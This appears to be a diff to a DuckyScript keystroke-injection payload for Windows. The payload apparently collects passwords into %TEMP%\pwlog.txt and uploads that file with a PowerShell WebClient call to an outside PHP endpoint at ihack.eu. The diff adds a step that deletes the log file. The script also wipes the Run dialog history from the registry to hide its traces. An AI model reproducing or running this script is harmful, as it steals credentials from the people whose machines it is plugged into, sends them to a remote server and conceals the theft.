@@ -37,19 +37,21 @@ DELAY 300
 STRING del %TEMP%\pw.exe
 ENTER
 DELAY 300
-REM Upload the results
-REM Create $content variable and store pwlog.txt to it
+REM Create $content variable, store pwlog.txt to it and upload using php script
 STRING powershell 
 DELAY 4000
 ENTER
-STRING $content = (gc -Path $env:TEMP\pwlog.txt | out-string); (New-Object Net.WebClient).UploadString('http://www.ihack.eu/files/rx.php', $content)
+STRING $content = (gc -Path $env:TEMP\pwlog.txt | out-string); (New-Object Net.WebClient).UploadString('http://www.ihack.eu/files/rx.php', $content) 
 DELAY 1500
+ENTER
+REM Delete pwlog.txt file
+STRING del $env:TEMP\pwlog.txt
 ENTER
 REM Clear the Run history and exit
 STRING "Remove-ItemProperty -Path 'HKCU:SoftwareMicrosoftWindowsCurrentVersionExplorerRunMRU' -Name '*' -ErrorAction SilentlyContinue"
 ENTER
 STRING exit
 ENTER
-DELAY 300
+DELAY 1000
 STRING exit
 ENTER
